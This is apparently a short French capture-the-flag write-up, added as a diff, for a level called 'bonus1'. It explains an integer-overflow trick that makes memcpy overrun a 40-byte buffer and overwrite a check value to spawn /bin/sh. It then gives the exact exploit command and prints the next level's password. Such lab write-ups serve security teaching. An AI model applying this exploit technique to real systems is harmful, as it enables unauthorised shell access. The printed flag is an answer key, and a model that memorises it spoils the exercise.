@@ -1,0 +1,21 @@
+on doit metre un nombre < 10 dans le premier argument
+et ensuite il doit etre == 0x574f4c46
+
+on met le premier argument a -2147483637 pour passe
+if (local_14 < 10)
+
+et le deuxieme argument a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW" pour remplir le buffer local_3c et avec l'overflow change la valeur de local_14 a 0x574f4c46
+char local_3c[40];
+
+memcpy(local_3c, argv[2], local_14 * 4);
+comme local_14 * 4 est caste en size_t (size_t)(-2147483637 * 4) == 44
+
+donc le buffer local_3c est overflow avec la valeur du deuxieme argument et donc la valeur de local_14 est change a 0x574f4c46 pour pouvoir passe le deuxieme if
+if (local_14 == 0x574f4c46)
+
+un shell est execute
+execl("/bin/sh", "sh", NULL);
+
+$ ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
